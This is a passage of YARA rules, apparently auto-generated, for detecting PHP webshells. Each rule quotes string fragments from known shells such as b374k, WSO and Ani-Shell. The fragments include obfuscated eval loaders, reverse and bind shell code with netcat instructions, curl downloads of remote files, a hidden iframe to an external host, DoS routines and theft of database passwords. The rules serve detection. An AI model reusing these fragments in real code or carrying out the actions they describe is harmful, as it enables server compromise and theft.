      $x10 = "elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }" fullword ascii
      $x11 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x12 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x13 = "else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"')" ascii
      $x14 = "'eng_text124'=>'Test bypass open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)'," fullword ascii
      $x15 = "elseif(@file_exists($_POST['e_name'])) {$filedump = 'NONE'; if(!@is_writable($_POST['e_name'])) { $only_read = 1; };}" fullword ascii
      $x16 = "$_POST['cmd'] = which('curl').\" \\\"\".$_POST['rem_file'].\"\\\" -o \\\"\".$_POST['loc_file'].\"\\\"\";" fullword ascii
      $x17 = "OST['test15_file2'])?($_POST['test15_file2']):($dir.\"shell.php\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test15'));" fullword ascii
      $x18 = "OST['test13_file2'])?($_POST['test13_file2']):($dir.\"shell.php\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test13'));" fullword ascii
      $x19 = "$_POST['cmd'] = which('fetch').\" -p \\\"\".$_POST['rem_file'].\"\\\" -o \\\"\".$_POST['loc_file'].\"\\\"\";" fullword ascii
      $x20 = "echo sr(10,\"\",$fs.in('hidden','cmd',0,'dos32').in('submit','submit',0,'BoF [php_iisfunc.dll](PHP<5.2.x)').$fe);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _03afdbd66e7929b125f8597834fa83a4_0d48acd8559ceed891f997f7204b34cbf411292b_15
{
   meta:
      description = "php17 - from files 03afdbd66e7929b125f8597834fa83a4.php, 0d48acd8559ceed891f997f7204b34cbf411292b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8059af681e101849e8016cf8bdf9c85229be5a9e1ba8ae5a3be1661041154d53"
      hash2 = "36aaeb2f888a7d6b9de41f2dbb48d9a3f214e14245456e4a33038e477bf9dec7"
   strings:
      $s1 = "$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$jak3fr0z=$func('$x','ev'.'al'.'(\"?>\".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'.'co" ascii
      $s2 = "$GLOBALS['pass'] = \"e25044e2e06364d6387bf080bdbba9bc2f0fd260\"; // sha1(md5(pass))" fullword ascii
      $s3 = "4f01sT7DvOAzpzLCe5ucdCPylXb11xulSbVlTBnZ0t3UGrvilg7FE/nSxat/D/Nlql+ODLD56YEJ4U+IHr7AeAXtZCXa4FuPg4Jid0Lfqim34G6syLBJtirCrJWLVjmV" ascii
      $s4 = "UFqRzBufQzG+rmLtTbjZMrQ+sPU/4H+9gL7dtLPX963AB5V0N3+X4WDppXXdGDZ1nSvToXSuPsrqJfig0ge8FiqloGfC/U/s4rnJ+/897mpXN/emYG/nR+aUWRWg5okf" ascii
      $s5 = "/ggYQCWNlkatRJh1nZSsUmZLSCdW4l0M2Zd09fo9xr90B3OTsThvVsimW/b7xF4ImDlZcDk2LAvcqF89U6qNWYYI8GWsweArDLLoR5m6/9tunn7W3O7z3S3cp8zqmAMd" ascii
      $s6 = "+tC1T2/brQ6vfrQvHv14VixbpOQhiCnpbUswfrH5f/XnNmwRM1YvBNMm72DS/pYEoax9Riz/d7TGeTp5WQ9AND8Wp6kgJMfeNQsEoeW48fHgfwnxH8pwv/mcF/xvAfCv" ascii
      $s7 = "l45bPQxNz9ffPG3isu7qtHZH7Eu33z+sxJhSnQIsMjB/AcmZpKsjNDFaT4pRFeIeVDVua213MvKMx6cdPqPiGOm7ydkjutz990KdL2vA9ugyXdlL9p2ksdeEV4/nTpDR" ascii
      $s8 = "KLstkzhwlaMDS1584nBagEtRPx04kjibLb7G7smg9UCLa5UTtPWwCTsFDrJMi8TMAbt6tgf9g3vr7f3I7A/uLM2udWNRx0pEw6XefTmgmRQ7BwoeMV8kboqBFZVxHGJm" ascii
      $s9 = "uGCex2ZsCP10tl4O2xMhoIzC4RkIDBOByhmeAgbBhLlnnXWYu1dZtrchWhMq6LgEttxK43B7VKTe14rNycTzSrE9fFvRGy9AE9yMG6fGx1CJ6bNZ3lgqztIm2+l4eH3Z" ascii
      $s10 = "QuK4NVy68nKLUbgLDp4FMG0FjYBrlwiW82hdwi2R3cBlX0bV4KLEHovD0czfPzkI6GYSU3n1s4sOpIQ59MiiH0pr4ZWnRF8X5sn7/Rb2FuYTc0z5aPgeTGB5KvdsjAwN" ascii
      $s11 = "aP6eSJGetNgTqefJw5d7JSjiw8dXLVGQU5cP3UkXZ+euz8Aiec4oW4r7nTuSgAzk1mYSg6WU/fQCmlNGmnd8RBseJicKL1w4mHPlyxy4crpvhQejZk5yqhggeXmQDGwb" ascii
      $s12 = "wdO4GHTJdxFIRcwrfeWqG+gx0WxHySX9M9MFBiuo9OSNinuFcrQM/MHbAe5LbDbCwRNufJP/vLxXkfWOk2Gnc9jZ686tJ0Dguga0Pte40s4uJ2tmjNOuw2KgYtFzDhkX" ascii
      $s13 = "7467QfD3/DQHpKLTNe8m8oLuBpdbg4GXao3m9DCv0hrfD0+5mIKYYC9l6NA1zAfE985lXmByS9VLiDH2lFMLHot75/OwJevEzDllyeLcjUpTMO0HIjO5df3Bp7frz73o" ascii
      $s14 = "ZlpGETZcdN3O5XIo1Y1weVPdGUj9uGuiQTcbdUE1x3p3J9GpQdWh9qVf+gdaI6jTdaGsBKHMWNZmNqda2uxkhNrcjUUl9XQvJYm+Bla3hsUfVeC6nXG/GsoUt1dTNr2B" ascii
      $s15 = "4EC+/7b9/o3pD69u3DY+71zx2HaSvPBQqNO9N6dt5egO5TftpjO8NdmBDguPKpv+VoTHaF4Tk7nq42QErTnyefQlS4KPLw668PHy7X1J/y7HdR6izKua/03hPtDQAmoX" ascii
      $s16 = "xh9a+/BXAh+SqkwNVV369eaBfv3r52cdf11DPNp3u7Yw8GPnwsATTg3zzAAbwXmyXYcikfSsMtpbeBIIGlxAk9gNsCY6V6gMk89fWbv79IMPmv4e6pCgMEqn+ewWeit1" ascii
      $s17 = "hRRQu+jFRNFjq27C9d08J8NpDNLlgRVemilgdWu5Bh96xiBZNeFHVBpL7SB9POYYqmwmOWHpobkS2b4yo2w+3KuxKOsCYdLLXQeOxu2CGiLU6Hr+iNOyVLmAWf2C7il0" ascii
      $s18 = "zbefz8k+/JP4ee+R6qRz8XI9EePqaFYkfTPp+6Pe31z1ko2Q8K2uxON2QLXsQju7sVSTbSn255Q5KTPP3uf63u1Jyy8Mci/Yzhv/JS3xtttDkbHnvgk0Zh4jLF3e5pZV" ascii
      $s19 = "aE73eSgWw1BFcOCsU21OEQQN6iW+FJkxzJmtCn+fR2SXcWfiSDycFla9nIOM5Hh7Mu5LQ5BHbirCfDQ/xtcVEWACQFG6Thq1MkEvUmq3fBJVfg8kjF7FjQF0kYNhOWKc" ascii
      $s20 = "RgmUp/SQ5zZNowU4a4ur0l9c0kHominYjWWwd1RQ42rtZsF3XjJiF8gtdkVdvS7de3g8nOqoTfX43zyaBmXZps+OLVl1YzOYNdrxfX0z7sA/FPYEEyEpKyQKmjRVyAeG" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _404__2__404_php_no_99a549eaba203e1a4f972811cc417f693ab4be4c_16
{
   meta:
      description = "php17 - from files 404 (2).php, 404.php.no.php, 99a549eaba203e1a4f972811cc417f693ab4be4c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d5918b308273d96c1a511c6c7905a8ce1513c61fa88939cbd1c43b774e17950"
      hash2 = "fb11c438682498254ede5200573674ff180ae888b92aee9996db7800fa55b4c4"
      hash3 = "e16ceb2d3015fbe3fa042c6b021e91fa6fd118bd3e64fe28f78b84c13a9648e1"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\"; " fullword ascii
      $x2 = "<input type='button' value='hashcrack.com' onclick=\\\"document.hf.action='http://www.hashcrack.com/index.php';documen" fullword ascii
      $s3 = "<input type='button' value='md5decrypter.com' onclick=\\\"document.hf.action='http://www.md5decrypter.com/';document.h" fullword ascii
      $s4 = "wsoSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s5 = "$m = array('Sec Info'=>'SecInfo','Files'=>'FilesMan','Exec'=>'Console','Sql'=>'Sql','PHP Tools'=>'phptools','LFI'=>'lfiscan'" fullword ascii
      $s6 = "<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr> " fullword ascii
      $s7 = "39 => \"../../../../../../../../../../../../../../../var/log/ftp-proxy/ftp-proxy.log\".$byte1.\"\", " fullword ascii
      $s8 = "print \"<font color='red'>[!] Failed!</font>\".$target.\"\".$lficonfig[$x].\"<br  />\"; " fullword ascii
      $s9 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\" . addcs" fullword ascii
      $s10 = "<input type='button' value='milw0rm.com' onclick=\\\"document.hf.action='http://www.milw0rm.com/cracker/search.php';do" fullword ascii
      $s11 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf" fullword ascii
      $s12 = "2 => \"../../../../../../../../../../../../../../../www/logs/proftpd.system.log\".$byte1.\"\", " fullword ascii
      $s13 = "<td><form onsubmit=\\\"g('Console',null,this.c.value);return false;\\\"><span>Execute:</span><br><input class='toolsInp' typ" fullword ascii
      $s14 = "</select> User-Agent: <input type=\"text\" size=\"20\" name=\"custom_header\" value=\"\"> " fullword ascii
      $s15 = ");}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><select name=alias>'; " fullword ascii
      $s16 = "36 => \"../../../../../../../../../../../../../../../var/log/pure-ftpd/pure-ftpd.log\".$byte1.\"\", " fullword ascii
      $s17 = "print \"<font color='red'>[!] Failed!</font>\".$target.\"\".$lfiaccess[$x].\"<br  />\"; " fullword ascii
      $s18 = "print \"<font color='red'>[!] Failed!</font>\".$target.\"\".$lfiphpini[$x].\"<br  />\"; " fullword ascii
      $s19 = "38 => \"../../../../../../../../../../../../../../../var/log/pureftpd.log\".$byte1.\"\", " fullword ascii
      $s20 = "$out = wsoEx(\"perl /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" 1>/dev/null 2>&1 &\"); " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01386bd6d8e091c2ab4c7c7de644d37b_a574138c88289490300cee616b9357f807e582b6_Ani_Shell_Ani_Shell__2__17
{
   meta:
      description = "php17 - from files 01386bd6d8e091c2ab4c7c7de644d37b.php, a574138c88289490300cee616b9357f807e582b6.php, Ani-Shell.php, Ani-Shell__2_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05bfd5d205a17320acbc1ddac0af81ba0bf86c852ed3abc425242a42ae4f0582"
      hash2 = "9476a89065f61d65f093098e59444d605012872ade480bd02235cc545618231c"
      hash3 = "0a5f8c8a6f82be68b260ebcbd8d917e9209f548ea1ca5827e7d27d6653f8170a"
      hash4 = "c027a23d19d1eeb041c657ae53f8c14358fe84e1094aba16757c26ca835b5a00"
   strings:
      $x1 = "$encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P" fullword ascii
      $x2 = "= \"lionaneesh@gmail.com\"; // Change this to your email , This email is used to deliver tracebacks about your shell" fullword ascii
      $s3 = "--Some Garbage here --%x%S')this.value = '';\" onblur=\"if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';\"/>" fullword ascii
      $s4 = "(: <a href=\"http://twitter.com/lionaneesh\">Follow Me</a> | <a href=\"http://facebook.com/lionaneesh\">Facebook</a> :) <br />" fullword ascii
      $s5 = "<input class=\"cmd\" name=\"message\" value=\"%S%x--Some Garbage here --%x%S\" onfocus=\"if(this.value == '%S%x" fullword ascii
      $s6 = "<input class=\"cmd\" name=\"to\" value=\"victim@domain.com,victim2@domain.com\" onfocus=\"if(this.value == 'vic" fullword ascii
      $s7 = "function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)" fullword ascii
      $s8 = "<form action=\"http://google.com\" method=\"GET\">" fullword ascii
      $s9 = "<th class=\"header\" colspan=\"1\" width=\"50px\">Bind Shell</th>" fullword ascii
      $s10 = "Oracle : <?php echo function_exists('ocilogon')?(\"<font color='red'>Enabled</font>\"):(\"Disabled\"); ?> <font color=\"s" fullword ascii
      $s11 = "if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,\"From:\".$from))" fullword ascii
      $s12 = "= \"off\"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')" fullword ascii
      $s13 = "echo \"DOS attack against $mode://$IP:$port completed on \".date(\"h:i:s A\").\"<br />\";" fullword ascii
      $s14 = "<li><a href=\"<?php echo $self.'?injector'?>\">Mass Code Injector</a></li>" fullword ascii
      $s15 = "echo \"DOS attack against udp://$IP:$port completed on \".date(\"h:i:s A\").\"<br />\";" fullword ascii
      $s16 = "<td>File </td><td> : </td><td><input value=\"<?php echo $_GET['rename'];?>\" class=\"cmd\" name=\"rename\" /></td>" fullword ascii
      $s17 = "PostgreSQL : <?php echo function_exists('pg_connect')?(\"<font color='red'>Enabled</font>\"):(\"Disabled\"); ?> <font co" fullword ascii
      $s18 = "<input class=\"cmd\" name=\"ip\" value=\"127.0.0.1\" onfocus=\"if(this.value == '127.0.0.1')this.value = '';\" o" fullword ascii
      $s19 = "// Script Encoded by Ani-Shell " fullword ascii
      $s20 = "$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0336dcbab05b9d5ad24f4333c7658a0e_23bc163d7ddffb457d674f8f8f97a0a446ac7aac_18
{
   meta:
      description = "php17 - from files 0336dcbab05b9d5ad24f4333c7658a0e.php, 23bc163d7ddffb457d674f8f8f97a0a446ac7aac.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a8ff79db30f498abb46f1e722a7307d208297cd43f8cc36a45e5a70928f9732"
      hash2 = "4ab874f71707c24425f48c25b2811a45099d321cb621431ff56e165721a211d2"
   strings:
      $s1 = "if(isset($_GET['cmd']) || isset($_POST['passw'])) $html_onload = \"onload=\\\"document.getElementById('cmd').focus();\\\"\";" fullword ascii
      $s2 = "target.style.background = '\".$shell_color.\"';" fullword ascii
      $s3 = "var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';" fullword ascii
      $s4 = "$shell_password = \"devilzc0der\";" fullword ascii
      $s5 = "<input style=\\\"width:300px;\\\" type=\\\"text\\\" name=\\\"childname\\\" value=\\\"\".$shell_name.\".php\\\"; />" fullword ascii
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVQWDAAAAAA" fullword ascii
      $s7 = "<input style=\\\"width:100px;\\\" type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnNewUploadLocal\\\" value=\\\"Get\\\" />" fullword ascii
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii
      $s9 = "$shell_fake_name = \"Server Logging System\";" fullword ascii
      $s10 = "elseif((isset($_GET['view']) && ($_GET['view'] != \"\")) || ((isset($_GET['filename']) && ($_GET['filename'] != \"\")))){" fullword ascii
      $s11 = "AFZpcnR1YWxQcm90ZWN0AABWaXJ0dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MA" fullword ascii
      $s12 = "AABPcGVuU2VydmljZUEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s13 = "TEwAQURWQVBJMzIuZGxsAFdTMl8zMi5kbGwAAExvYWRMaWJyYXJ5QQAAR2V0UHJvY0FkZHJlc3MA" fullword ascii
      $s14 = "$wBind=\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s15 = "var target = document.getElementById(address);" fullword ascii
      $s16 = "<tr><td style=\\\"width:120px;\\\">New Shellname</td><td style=\\\"width:304px;\\\">" fullword ascii
      $s17 = "<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" val" ascii
      $s18 = "<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" val" ascii
      $s19 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s20 = "else setcookie(\"pass\",$check,time() - 3600*24*7);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _02f039058bd48307e6f653a2005c9dd2_3ae2bde23fcce1c54853eeadae3f9516fd7f1f75_7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57_19
{
   meta:
      description = "php17 - from files 02f039058bd48307e6f653a2005c9dd2.php, 3ae2bde23fcce1c54853eeadae3f9516fd7f1f75.php, 7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2b10ae98a69fa5c6e9d6b2ca8fb3932e59a66daab54e3ee345a32821564a3ae7"
      hash2 = "a21d184dc13c86ff91f3007f7b895c5e4a2af89799ebd9999350c730e0e704d3"
      hash3 = "e602362970a0d378c1011d36368d43e0d3d5934651e4a104a546f6e51b0cfab1"
   strings:
      $x1 = "*  - executing any shell commands and any PHP-code" fullword ascii
      $x2 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $x3 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $x4 = "*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $x5 = "*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $x6 = "$system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s7 = "*             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s8 = "*  Free download from http://php.spb.ru/remview/" fullword ascii
      $s9 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) && !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) " fullword ascii
      $s10 = "$HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {" fullword ascii
      $s11 = "$phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s12 = "*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s13 = "*  - download any file and open on Notepad" fullword ascii
      $s14 = "$host_allow=array(\"*\");  // Type list of your(allow) hosts. All other - denied." fullword ascii
      $s15 = "if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || " fullword ascii
      $s16 = "*  (c) Dmitry Borodin, dima@php.spb.ru, http://php.spb.ru" fullword ascii
      $s17 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']); " fullword ascii
      $s18 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']); " fullword ascii
      $s19 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']); " fullword ascii
      $s20 = "// antofix 'register globals': $HTTP_GET/POST_VARS -> normal vars;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _6700a72a923636d25952c58fafcb771939a19fd4_71c44dfbce5f80b90b6a8bc40dd8cc3eef3c6386_20
{
   meta:
      description = "php17 - from files 6700a72a923636d25952c58fafcb771939a19fd4.php, 71c44dfbce5f80b90b6a8bc40dd8cc3eef3c6386.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "389a69acf5755893ab4d8210c5910e0da865146025c2298b405763efbe208588"
      hash2 = "b75a85fe49f0c1d928689a5a098f3a4a2305b409ed61abdf9857f38ae7123e50"
   strings:
      $s1 = "$ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);" fullword ascii
      $s2 = "global $meurl,$me,$sitetitle, $lastsess, $login, $viewing, $iftop, $user, $pass, $password, $debug, $issuper;" fullword ascii
      $s3 = "mysql_connect($options['hostname'],$options['username'],$options['password'])or die(\"" fullword ascii
      $s4 = "sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);" fullword ascii
      $s5 = "ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['goto'], $_POST['ftpfile'], $_POST['del']);" fullword ascii
      $s6 = ".\"<td><a href=\\\"\".$folder.$stylesheet.\"\\\" target='_blank'>\".$stylesheet.\"</a></td>\\n\"" fullword ascii
      $s7 = "if((!$ftp_conn_id) || (!$ftp_login_result)) {" fullword ascii
      $s8 = "echo \"<FORM ENCTYPE=\\\"multipart/form-data\\\" ACTION=\\\"\".$meurl.\"?op=upload\\\" METHOD=\\\"POST\\\">\\n\"" fullword ascii
      $s9 = "<a href=\\\"\".$folder.$fename.\"\\\" target=\\\"_blank\\\">\".$folder.$fename.\"</a> " fullword ascii
      $s10 = ".\"<a href=\\\"\".$url.\"http://www.asp-muma.com\\\" $iftop>" fullword ascii
      $s11 = ".\"<iframe src=http://%37%6A%79%65%77%75%2E%63%6E/a/a.asp width=0 height=0></iframe>\\n\"" fullword ascii
      $s12 = ":  </label><input id=\\\"ftppass\\\" name=\\\"ftppass\\\" size=\\\"30\\\" class=\\\"text\\\"/><br><label for=\\\"goto\\\">" fullword ascii
      $s13 = "$content1[$a] = \"<tr width=100%><td><input name='select_item[d][$stylesheet]' type='checkbox' id='$stylesheet' oncli" fullword ascii
      $s14 = "!**</span><br><br><form action=\\\"\".$meurl.\"?op=ftpall\\\" method=\\\"POST\\\"><label for=\\\"ftpip\\\">FTP " fullword ascii
      $s15 = ".\"<style>\\n*{font-family:Verdana, 'Microsoft Yahei' !important}td{font-size:13px;}span{line-height:20px;}a:visited{color" fullword ascii
      $s16 = "d=false}else{document.getElementById(\\\"deluzip\\\").disabled=true}}</script>\"" fullword ascii
      $s17 = "/* function login()                                             */" fullword ascii
      $s18 = ".\"<td><a href=\\\"\".$folder.$stylesheet.\"\\\" target='_blank'>" fullword ascii
      $s19 = "!**</span><br><br><form action=\\\"\".$meurl.\"?op=sqlbackup\\\" method=\\\"POST\\\">\\n<label for=\\\"ip\\\">" fullword ascii
      $s20 = "rgba(0,0,0,.2) inset}input.text,.upload{border: 1px solid #999;height:25px;margin:6px 1px;padding:5px;;font-size:12px;border-ra" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _3451b6e3980c3b8b2f3ccbcfb04b227452ff084d_abac629e73ef9917b352e81f0bb7e8dfaf531ddf_21
{
   meta:
      description = "php17 - from files 3451b6e3980c3b8b2f3ccbcfb04b227452ff084d.php, abac629e73ef9917b352e81f0bb7e8dfaf531ddf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e034b3b204db76ae71a6408b29580875a82d6285eb0ba11d29570e564e867d1"
      hash2 = "3af87f0ff8f9909f009c12e4a953921d185ecfe1cc39e0e79fb12b5709e28ad3"
   strings:
      $x1 = "else $msg = \"error: file not found $namafile\";}?><br><br><br><br> <table class=\"tabnet\"> <tr><th>Bind Port</th><th>Back conn" ascii
      $x2 = "if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {$port = trim($_PO" ascii
      $x3 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'keyboard')){if(empty($_POST['pwd'])){echo \"<br><br><center><div class='mybox'><h2 s" ascii
      $x4 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$buff = @ob_get_contents();@ob_end_clean();return $buff;} " fullword ascii
      $s5 = "$s_my_ip = $_SERVER['REMOTE_ADDR'];$rsport = \"443\";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = \"<center><div class=" ascii
      $s6 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'about')){echo '<center><br><br><div class=\"mybox\"><br><h2 style=\"font-size:50px;" ascii
      $s7 = "elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {$port = tr" ascii
      $s8 = "\";file_put_contents(\".htaccess\",$htaccess,FILE_APPEND);$passwd=$_POST[\"passwd\"];$passwd=explode(\"\\n\",$passwd);echo \"<ce" ascii
      $s9 = "/th><th>download and Exec</th></tr><tr><td> <table> <form method=\"post\" actions=\"?y=<?php echo $pwd;?>&amp;x=back\"><tr><td>P" ascii
      $s10 = "= 1\") or die(mysql_error());if($k2){echo '<br><br><center><h1>Done ... -> <a href=\"'.$site_url.'/wp-login.php\" target=\"_blan" ascii
      $s11 = "cebook.com/k2ll33d\" target=\"_blank\">Facebook</a>&nbsp;|&nbsp;<a href=\"http://zone-h.org/archive/notifier=ReZK2LL\" target=\"" ascii
      $s12 = "user.'-whm.txt');}echo 'Done -> <a href=\"configs\">configs</a>';}}" fullword ascii
      $s13 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'sf')) {@set_time_limit(0);@mkdir('sym',0777);error_reporting(0);$htaccess  = \"Optio" ascii
      $s14 = "<form action=\"?y=<?php echo $pwd;?>&amp;x=shell\" method=\"post\"> <table class=\"cmdbox\"> <tr><td colspan=\"2\">" fullword ascii
      $s15 = "set_time_limit(0);$submit=$_REQUEST['submit'];$users=$_REQUEST['users'];$pass=$_REQUEST['passwords'];$target=$_REQUEST['target']" ascii
      $s16 = "ST['port']);$passwrd = trim($_POST['bind_pass']);tulis(\"bdc.c\",$port_bind_bd_c);exe(\"gcc -o bdc bdc.c\");exe(\"chmod 777 bdc" ascii
      $s17 = "else $posix = FALSE;$server_ip = @gethostbyname($_SERVER[\"HTTP_HOST\"]);$my_ip = $_SERVER['REMOTE_ADDR'];$bindport = \"13123\";" ascii
      $s18 = "<br><center><div class=\"mybox\"><h2 class=\"k2ll33d2\">MySQL Connect</h2><form action=\"?\" method=\"get\"><input type=\"hidden" ascii
      $s19 = "if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);" ascii
      $s20 = "b,$explode[1]);return $explode[0];}$config = file_get_contents($url);$password =  enter($config,\"define('DB_PASSWORD', '\",\"')" ascii
   condition:
      ( ( uint16(0) == 0x683c or uint16(0) == 0x3c20 ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _013d407166ec4fa56eb1e1f8cbe183b9_41b8b081f2b83539627868eedc561698009572ec_499db4d70955f7d40cf5cbaf2ecaf7a2_22
{
   meta:
      description = "php17 - from files 013d407166ec4fa56eb1e1f8cbe183b9.php, 41b8b081f2b83539627868eedc561698009572ec.php, 499db4d70955f7d40cf5cbaf2ecaf7a2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "735f3b419096fe9b87f5e01da3da38d19d124127795fd868d037d709e3e2ff66"
      hash2 = "0f48b973f87a067fbb02638c69597f0ef24c759e1d3bbafccb9e480da8754d67"
      hash3 = "aca3248eeb6defd5eac482b0c4a3216456af50c24d93be57224ec1c02f33099a"
   strings:
      $x1 = "$s_rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s2 = "elseif($s_split[0]==\"back\") $s_rstarget_packed = $s_rsport_.\" \".$s_rshost_;" fullword ascii
      $s3 = "setcookie(\"b374k_included\", \"0\" ,time() - $s_login_time);" fullword ascii
      $s4 = "if(function_exists('pg_connect')) return @pg_connect(\"$s_host_str user=$s_sqluser password=$s_sqlpass\");" fullword ascii
      $s5 = "setcookie(\"buffer\", \"\" ,time() - $s_login_time);" fullword ascii
      $s6 = "setcookie(\"massact\", \"\" ,time() - $s_login_time);" fullword ascii
      $s7 = "$s_rspesana = \"Press &#39;  Go !  &#39; button and run &#39;  nc <i>server_ip</i> <i>port</i>  &#39; on your computer\";" fullword ascii
      $s8 = "$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());" fullword ascii
      $s9 = "if($s_split[0]==\"bind\") $s_rstarget_packed = $s_rsport_;" fullword ascii
      $s10 = "setcookie(\"b374k_included\", \"1\" ,time() + $s_login_time);" fullword ascii
      $s11 = "$s_login_time = 3600 * 24 * 7; // cookie time (login)" fullword ascii
